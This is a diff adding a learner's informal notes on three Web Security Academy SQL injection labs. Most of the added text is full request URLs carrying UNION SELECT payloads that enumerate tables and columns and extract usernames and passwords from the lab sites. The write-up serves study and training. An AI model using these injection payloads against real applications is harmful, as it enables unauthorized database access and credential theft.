@@ -77,3 +77,47 @@ After this i saw i can see hidden stuff also so came to know i am in right direc
 ```
 It displayed the database version.
 
+
+## Lab: SQL injection attack, listing the database contents on non-Oracle databases:
+in this i need to do a UNION attack to get the table and the column to get find where the username and the password are stored in the datbase it was a non_oracle database i need top refer cheat sheet for it i use 
+```bash
+https://0ae9005f03bbc1c382e8a7c800cc0009.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+table_name,null+from+information_schema.tables--
+```
+To display the hidden table. I found one data ```users_fglvqz``` which could contain login information so now i put a link:
+```bash
+https://0ae9005f03bbc1c382e8a7c800cc0009.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+column_name,null+from+information_schema.columns+where+table_name=%27users_fglvqz%27--
+```
+i got the column_name that contains the user and pass which was username column was ```username_cwhlov``` and password column was ```password_wbhfsw```.
+As now i know the column name also my input was:
+```bash
+https://0ae9005f03bbc1c382e8a7c800cc0009.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+username_cwhlov,password_wbhfsw+from+users_fglvqz-
+```
+it displayed the administrator and password.
+
+## Lab: SQL injection attack, listing the database contents on Oracle:
+I first decided to print all the table so after seeing the cheat sheet i put the commans:
+```bash
+https://0af000d4038da6868019bcd9008f0034.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+table_name,null+from+all_tables--
+```
+i used ```all_tables``` as it is a oracle database.
+i now decided to get column from table 
+```bash
+https://0af000d4038da6868019bcd9008f0034.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+column_name,null+from+all_tab_columns+where+table_name=%27USERS_YVITGQ%27--
+```
+i got the two column name for the user and password.
+```bash
+https://0af000d4038da6868019bcd9008f0034.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+EMAIL,PASSWORD_TAIUGS+from+USERS_YVITGQ--
+```
+after running this i got the password.
+
+## Lab: SQL injection UNION attack, determining the number of columns returned by the query
+To determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
+i starting adding the null column
+```bash
+https://0ae600de03aad8ea82d1519e00ba00ac.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL--
+```
+I got an error so i starting to get mor null to see the output.
+```bash
+https://0ae600de03aad8ea82d1519e00ba00ac.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL,null,null--
+```
+with this i solved the challenge.
